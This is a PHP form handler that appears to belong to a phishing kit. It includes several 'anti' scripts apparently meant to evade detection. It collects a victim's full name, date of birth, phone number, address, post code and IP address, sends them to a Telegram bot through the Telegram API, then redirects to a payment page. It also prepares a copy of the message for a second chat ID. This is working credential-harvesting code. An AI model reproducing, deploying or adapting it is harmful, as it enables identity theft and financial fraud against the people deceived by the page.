<?php




    include "../../../prevents/anti1.php";
    include "../../../prevents/anti2.php";
    include "../../../prevents/anti3.php";
    include "../../../prevents/anti4.php";
    include "../../../prevents/anti5.php";
    include "../../../prevents/anti6.php";
    include "../../../prevents/anti7.php";

    include "config.php";
    $name = $_POST["n1"];$date   = $_POST["n2"];$Adresse  = $_POST["addr"];$zip      = $_POST["zip"];$tele     = $_POST["phone"];$city     = $_POST["vill"];$country     = $_POST["cunt"];
    $message='[🧛] === INFOS === [🧛]'."\n".'[🧬] Full Name : ' .$name."\n".'[🧬] Date of Birth : '.$date."\n".'[🧬] Phone : '.$tele."\n".'[💊] City : '.$city."\n".'[💊] Country : '.$country."\n".'[💊] Address : '.$Adresse."\n".'[💊] Post code : '.$zip."\n".'[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";$data = ['chat_id' => $chat_id,'text' => $message,]; $secure_red_falg = ['chat_id' => $secure,'text' => $message,]; $response = file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data)); 
    header("Location: ../../payment.php");
    exit();

?>